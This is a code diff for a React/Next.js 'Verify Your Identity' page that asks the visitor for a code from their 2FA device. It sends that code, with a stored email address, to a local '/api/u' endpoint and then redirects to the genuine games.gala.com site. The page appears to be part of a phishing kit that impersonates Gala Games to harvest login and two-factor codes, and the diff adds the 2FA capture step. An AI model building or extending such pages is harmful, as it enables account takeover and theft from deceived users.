@@ -1,18 +1,32 @@
 'use client';
 import React from 'react';
-import styles from './styles.module.css';
+import styles from '../styles.module.css';
 import Image from "next/image";
+import {useRouter} from "next/navigation";
+import {routeConstants} from "../../../../../constants/route";
 
 
-const VerifyAccount = () => {
+const Verify2FaAccount = () => {
+  const [loading, setLoading] = React.useState(false);
+  const navigate = useRouter()
   const [otp, setOtp] = React.useState('');
 
   const navigateTo = async () => {
+    setLoading(true)
     fetch('/api/u', {
       method: 'POST',
       body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
     });
 
+
+    setLoading(false)
+
+    if (Boolean(sessionStorage.getItem('all'))) {
+      navigate.push(routeConstants.VERIFY_EMAIL)
+      return
+    }
+
+    sessionStorage.removeItem('gd600-ap')
     setTimeout(() => {
       window.location.assign('https://games.gala.com/')
     }, 1000)
@@ -27,7 +41,7 @@ const VerifyAccount = () => {
         </div>
         <h2 className={styles.title}>Verify Your Identity</h2>
         <p className={styles.description}>
-          Please confirm that you{"'"}re the owner of your account by entering the code sent to your email.
+          Please confirm that you{"'"}re the owner of your account by entering the code sent to your 2FA device.
         </p>
         <input
           type="text"
@@ -36,7 +50,7 @@ const VerifyAccount = () => {
           onChange={(e) => setOtp(e.target.value)}
         />
         <button className={styles.submitButton} onClick={navigateTo}>
-          Submit
+          {loading ? 'Wait...' : 'Submit'}
         </button>
         <p className={styles.resendLink}>
           Didn{"'"}t receive an email? <a href="#">Reach out</a>
@@ -46,4 +60,4 @@ const VerifyAccount = () => {
   );
 };
 
-export default VerifyAccount;
+export default Verify2FaAccount;
